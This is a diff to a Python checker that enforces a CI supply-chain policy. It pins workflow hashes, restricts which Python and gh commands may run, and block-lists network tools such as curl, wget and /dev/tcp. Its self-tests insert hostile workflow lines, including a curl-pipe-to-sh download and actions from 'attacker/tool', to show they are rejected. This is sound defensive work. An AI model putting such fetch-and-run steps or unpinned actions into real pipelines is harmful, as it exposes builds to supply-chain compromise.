@@ -20,14 +20,27 @@ POLICY_PATH = ROOT / "ci" / "supply-chain.json"
 WORKFLOWS = ROOT / ".github" / "workflows"
 FULL_SHA_RE = re.compile(r"[0-9a-f]{40}\Z")
 FULL_SHA256_RE = re.compile(r"[0-9a-f]{64}\Z")
-USE_RE = re.compile(r"^\s*-?\s*uses:\s*([^@\s]+)@([^\s#]+)", re.MULTILINE)
+USE_RE = re.compile(
+    r'''^\s*(?:-\s*)?(?:"uses"|'uses'|uses)\s*:\s*(?:"([^"]+)"|'([^']+)'|([^\s#]+))''',
+    re.MULTILINE)
+USES_KEY_RE = re.compile(r'''(?<![A-Za-z0-9_])(?:"uses"|'uses'|uses)\s*:''')
+YAML_KEY_ESCAPE_RE = re.compile(r"\\(?:u[0-9a-fA-F]{4}|x[0-9a-fA-F]{2})")
 INSTALL_RE = re.compile(
     r"^\s*python3\s+scripts/install_ci_tool\.py\s+([a-z0-9_-]+)\s+--destination\b",
     re.MULTILINE)
-DIRECT_DOWNLOAD_RE = re.compile(
-    r"\b(?:curl|wget)\b|urllib\.request|urlopen\s*\(|requests\.(?:get|request)\s*\("
-    r"|Invoke-WebRequest",
+FORBIDDEN_ACQUISITION_RE = re.compile(
+    r"\b(?:curl|wget|aria2c|Invoke-WebRequest)\b|urllib\.request|urlopen\s*\("
+    r"|requests\.(?:get|request)\s*\(|http\.client|aiohttp|httpx|/dev/tcp/",
     re.IGNORECASE)
+PYTHON_RE = re.compile(r"\bpython(?:3(?:\.\d+)?)?\s+([^\s\\]+)")
+GH_RE = re.compile(r"(?:^\s*|\brun:\s*)gh\s+([^\n]+)", re.MULTILINE)
+ALLOWED_PYTHON = {
+    "ci.yml": {"scripts/install_ci_tool.py", "scripts/release_publish_preflight.py",
+               "scripts/verify_release_manifest.py"},
+    "docs.yml": {"scripts/install_ci_tool.py"},
+    "release-validation.yml": {"scripts/install_ci_tool.py"},
+    "supply-chain-refresh.yml": {"scripts/ci_supply_chain.py"},
+}
 
 
 def validate_policy_shape(policy: object) -> list[str]:
@@ -35,13 +48,18 @@ def validate_policy_shape(policy: object) -> list[str]:
     if type(policy) is not dict or type(policy.get("schema")) is not int or \
             policy.get("schema") != 1:
         return ["policy root/schema must be object/schema 1"]
-    if set(policy) != {"schema", "actions", "tools", "workflow_tools"}:
-        errors.append("policy keys must be exactly schema/actions/tools/workflow_tools")
+    if set(policy) != {"schema", "actions", "tools", "workflow_tools",
+                       "workflow_sha256"}:
+        errors.append("policy keys must be exactly schema/actions/tools/"
+                      "workflow_tools/workflow_sha256")
     actions = policy.get("actions")
     tools = policy.get("tools")
     workflow_tools = policy.get("workflow_tools")
-    if type(actions) is not dict or type(tools) is not dict or type(workflow_tools) is not dict:
-        return errors + ["policy actions, tools, and workflow_tools must be objects"]
+    workflow_sha256 = policy.get("workflow_sha256")
+    if type(actions) is not dict or type(tools) is not dict or \
+            type(workflow_tools) is not dict or type(workflow_sha256) is not dict:
+        return errors + ["policy actions, tools, workflow_tools, and workflow_sha256 "
+                         "must be objects"]
     for name, pin in actions.items():
         if not isinstance(name, str) or not name:
             errors.append("action names must be non-empty strings")
@@ -84,6 +102,52 @@ def validate_policy_shape(policy: object) -> list[str]:
             errors.append(f"workflow_tools entry {filename!r} must be a unique string list")
         elif not set(required) <= set(tools):
             errors.append(f"workflow_tools entry {filename!r} names an unknown tool")
+    if set(workflow_sha256) != set(workflow_tools):
+        errors.append("workflow_sha256 and workflow_tools file sets disagree")
+    for filename, digest in workflow_sha256.items():
+        if not isinstance(filename, str) or not isinstance(digest, str) or \
+                FULL_SHA256_RE.fullmatch(digest) is None:
+            errors.append(f"workflow_sha256 entry {filename!r} is invalid")
+    return errors
+
+
+def workflow_hash(text: str) -> str:
+    return hashlib.sha256(text.encode()).hexdigest()
+
+
+def action_uses(text: str) -> list[tuple[str, str]]:
+    observed: list[tuple[str, str]] = []
+    for groups in USE_RE.findall(text):
+        value = next(group for group in groups if group)
+        if "@" not in value:
+            observed.append((value, ""))
+        else:
+            observed.append(tuple(value.rsplit("@", 1)))
+    return observed
+
+
+def acquisition_route_errors(filename: str, text: str) -> list[str]:
+    """Allow only reviewed workflow acquisition entrypoints.
+
+    The whole-file digest is the primary byte allowlist. These structural
+    checks keep a deliberate digest update from approving interpreter/client
+    bypasses without an accompanying policy-contract change.
+    """
+    errors: list[str] = []
+    active = "\n".join(line for line in text.splitlines()
+                       if not line.lstrip().startswith("#"))
+    logical = re.sub(r"\\\s*\n\s*", " ", active)
+    if FORBIDDEN_ACQUISITION_RE.search(logical):
+        errors.append(f"{filename} contains a forbidden acquisition mechanism")
+    allowed_python = ALLOWED_PYTHON.get(filename, set())
+    for target in PYTHON_RE.findall(logical):
+        if target not in allowed_python:
+            errors.append(f"{filename} invokes unapproved Python entrypoint {target}")
+    for command in GH_RE.findall(logical):
+        if filename != "ci.yml" or \
+                not re.match(r'release\s+(?:create|upload|download)\s+"\$\{GITHUB_REF_NAME\}"',
+                             command) or re.search(r"(?:^|\s)(?:--repo|-R)(?:\s|=)", command):
+            errors.append(f"{filename} invokes unapproved gh route: {command.strip()}")
     return errors
 
 
@@ -95,14 +159,19 @@ def validate(policy: object, workflow_texts: dict[str, str], metadata_text: str,
     actions = policy["actions"]
     tools = policy["tools"]
     workflow_tools = policy["workflow_tools"]
+    workflow_sha256 = policy["workflow_sha256"]
 
     observed_actions: set[str] = set()
     for filename, text in workflow_texts.items():
         if re.search(r"releases/latest|/latest/|releases/download/\$", text, re.I):
             errors.append(f"{filename} contains a movable latest/download reference")
-        if DIRECT_DOWNLOAD_RE.search(text):
-            errors.append(f"{filename} contains a direct download mechanism")
-        for action, ref in USE_RE.findall(text):
+        if workflow_hash(text) != workflow_sha256.get(filename):
+            errors.append(f"{filename} bytes disagree with workflow_sha256 policy")
+        errors.extend(acquisition_route_errors(filename, text))
+        uses = action_uses(text)
+        if len(uses) != len(USES_KEY_RE.findall(text)) or YAML_KEY_ESCAPE_RE.search(text):
+            errors.append(f"{filename} contains unsupported or escaped YAML key syntax")
+        for action, ref in uses:
             observed_actions.add(action)
             expected = actions.get(action)
             if expected is None:
@@ -191,6 +260,16 @@ def self_test() -> int:
     failures = int(bool(validate(policy, workflows, metadata, toolchain)))
     cases: list[tuple[object, dict[str, str], str, str]] = []
 
+    def workflow_case(filename: str, suffix: str) -> tuple[dict, dict[str, str], str, str]:
+        changed_policy = copy.deepcopy(policy)
+        changed_workflows = dict(workflows)
+        changed_workflows[filename] += suffix
+        # Model an intentional workflow-digest update so each fixture exercises
+        # the structural route/action contract rather than only the byte lock.
+        changed_policy["workflow_sha256"][filename] = workflow_hash(
+            changed_workflows[filename])
+        return changed_policy, changed_workflows, metadata, toolchain
+
     boolean_schema = copy.deepcopy(policy)
     boolean_schema["schema"] = True
     cases.append((boolean_schema, workflows, metadata, toolchain))
@@ -209,13 +288,29 @@ def self_test() -> int:
     first = next(iter(movable_workflow))
     movable_workflow[first] = movable_workflow[first].replace(
         policy["actions"]["actions/checkout"]["commit"], "v6")
-    cases.append((policy, movable_workflow, metadata, toolchain))
+    movable_policy = copy.deepcopy(policy)
+    movable_policy["workflow_sha256"][first] = workflow_hash(movable_workflow[first])
+    cases.append((movable_policy, movable_workflow, metadata, toolchain))
     yaml_bypass = dict(workflows)
     yaml_bypass["bypass.yaml"] = "steps:\n  - uses: actions/checkout@v6\n"
     cases.append((policy, yaml_bypass, metadata, toolchain))
-    direct_download = dict(workflows)
-    direct_download["docs.yml"] += "\n      - run: curl https://example.com/tool-v1 | sh\n"
-    cases.append((policy, direct_download, metadata, toolchain))
+    byte_drift = dict(workflows)
+    byte_drift["docs.yml"] += "\n# unreviewed workflow byte drift\n"
+    cases.append((policy, byte_drift, metadata, toolchain))
+    cases.append(workflow_case(
+        "docs.yml", "\n      - run: curl https://example.com/tool-v1 | sh\n"))
+    cases.append(workflow_case(
+        "docs.yml", '\n      - "uses": attacker/tool@main\n'))
+    cases.append(workflow_case(
+        "docs.yml", "\n      - uses : attacker/tool@main\n"))
+    cases.append(workflow_case(
+        "docs.yml", '\n      - run: python3 -c "import http.client as h; '
+        'h.HTTPSConnection(\'example.com\')"\n'))
+    cases.append(workflow_case(
+        "docs.yml", "\n      - run: gh release download v1 --repo attacker/tool\n"))
+    cases.append(workflow_case(
+        "ci.yml", '\n      - run: |\n          gh release download "${GITHUB_REF_NAME}" \\\n'
+        '            --repo attacker/tool\n'))
     cases.append((policy, workflows, metadata.replace(
         "https://github.com/nabbisen/henret", "https://example.com/placeholder"),
                   toolchain))
